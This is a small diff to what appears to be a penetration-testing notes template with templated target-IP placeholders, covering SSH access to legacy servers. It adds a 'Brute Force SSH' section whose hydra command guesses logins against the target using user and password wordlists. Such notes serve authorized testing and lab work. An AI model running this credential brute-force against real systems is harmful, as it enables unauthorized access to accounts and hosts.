@@ -12,3 +12,8 @@ Addional errors: Unable to negotiate with <% tp.frontmatter.target_ip %>  port 2
 ```bash
 ssh <% tp.frontmatter.target_ip %> -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc
 ```
+
+### Brute Force SSH
+```
+hydra -s 22 -L users.txt -P wordlist.txt -t 4 <% tp.frontmatter.target_ip %> ssh
+```
